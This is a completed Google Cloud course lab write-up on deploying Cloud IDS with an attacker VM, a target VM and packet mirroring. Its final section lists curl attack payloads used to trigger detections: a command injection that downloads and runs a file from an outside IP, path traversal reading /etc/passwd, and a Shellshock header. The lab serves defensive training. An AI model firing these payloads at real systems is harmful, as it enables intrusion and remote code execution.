# 🛡️ Lab: Getting Started with Cloud IDS

---

## 🧪 Lab Summary

In this lab, you deploy and test **Google Cloud IDS (Intrusion Detection System)**. The lab walks through deploying a Cloud IDS endpoint, simulating multiple threats, and reviewing threat detection and response through the Cloud Console and Logging.

---

## 🎯 Objectives

- Create a VPC and configure private services access
- Deploy a Cloud IDS endpoint
- Create two VMs: one attacker and one target server
- Configure a Cloud IDS packet mirroring policy
- Simulate attack traffic
- Review threat data in Cloud Console and Logging

---

## 🛠️ Reference Commands

### Enable Required APIs
```bash
gcloud services enable servicenetworking.googleapis.com
gcloud services enable ids.googleapis.com
gcloud services enable logging.googleapis.com
```

### Create VPC and Subnet
```bash
gcloud compute networks create cloud-ids --subnet-mode=custom
gcloud compute networks subnets create cloud-ids-useast1 \
  --range=192.168.10.0/24 --network=cloud-ids --region=us-east1
```

### Configure Private Services Access
```bash
gcloud compute addresses create cloud-ids-ips \
  --global --purpose=VPC_PEERING \
  --addresses=10.10.10.0 --prefix-length=24 \
  --description="Cloud IDS Range" --network=cloud-ids

gcloud services vpc-peerings connect \
  --service=servicenetworking.googleapis.com \
  --ranges=cloud-ids-ips --network=cloud-ids
```

### Create IDS Endpoint
```bash
gcloud ids endpoints create cloud-ids-east1 \
  --network=cloud-ids --zone=us-east1-b \
  --severity=INFORMATIONAL --async
```

### Create Firewall Rules
```bash
gcloud compute firewall-rules create allow-http-icmp \
  --direction=INGRESS --priority=1000 \
  --network=cloud-ids --action=ALLOW \
  --rules=tcp:80,icmp --source-ranges=0.0.0.0/0 --target-tags=server

gcloud compute firewall-rules create allow-iap-proxy \
  --direction=INGRESS --priority=1000 \
  --network=cloud-ids --action=ALLOW \
  --rules=tcp:22 --source-ranges=35.235.240.0/20
```

### Create Cloud NAT
```bash
gcloud compute routers create cr-cloud-ids-useast1 \
  --region=us-east1 --network=cloud-ids

gcloud compute routers nats create nat-cloud-ids-useast1 \
  --router=cr-cloud-ids-useast1 --router-region=us-east1 \
  --auto-allocate-nat-external-ips --nat-all-subnet-ip-ranges
```

### Create VMs
```bash
gcloud compute instances create server \
  --zone=us-east1-b --machine-type=e2-medium \
  --subnet=cloud-ids-useast1 --no-address \
  --private-network-ip=192.168.10.20 \
  --metadata=startup-script='#! /bin/bash\nsudo apt-get update\nsudo apt-get -qq -y install nginx' \
  --tags=server --image=debian-11-bullseye-v20240709 \
  --image-project=debian-cloud --boot-disk-size=10GB

gcloud compute instances create attacker \
  --zone=us-east1-b --machine-type=e2-medium \
  --subnet=cloud-ids-useast1 --no-address \
  --private-network-ip=192.168.10.10 \
  --image=debian-11-bullseye-v20240709 \
  --image-project=debian-cloud --boot-disk-size=10GB
```

### Mirror Packets to Cloud IDS
```bash
export FORWARDING_RULE=$(gcloud ids endpoints describe cloud-ids-east1 \
  --zone=us-east1-b --format="value(endpointForwardingRule)")

gcloud compute packet-mirrorings create cloud-ids-packet-mirroring \
  --region=us-east1 --collector-ilb=$FORWARDING_RULE \
  --network=cloud-ids --mirrored-subnets=cloud-ids-useast1
```

### Simulate Attack Commands (Run on Attacker VM)
```bash
# Low Severity
curl "http://192.168.10.20/weblogin.cgi?username=admin';cd /tmp;wget http://123.123.123.123/evil;sh evil;rm evil"

# Medium Severity
curl http://192.168.10.20/?item=../../../../WINNT/win.ini
curl http://192.168.10.20/eicar.file

# High Severity
curl http://192.168.10.20/cgi-bin/../../../..//bin/cat%20/etc/passwd

# Critical Severity
curl -H 'User-Agent: () { :; }; 123.123.123.123:9999' http://192.168.10.20/cgi-bin/test-critical
```

---

## ✅ Validation

- [x] Enabled necessary APIs
- [x] Created VPC and subnet
- [x] Deployed IDS endpoint
- [x] Created and configured firewall rules
- [x] Created VMs and prepared server with EICAR test file
- [x] Simulated network attacks and verified IDS detection
- [x] Viewed threats via Cloud IDS and Cloud Logging

---

**Course:** Security in Google Cloud  
**Module:** Intrusion Detection with Cloud IDS  
**Completed by:** Lisa Mary Lee  
**Date:** May 15, 2025
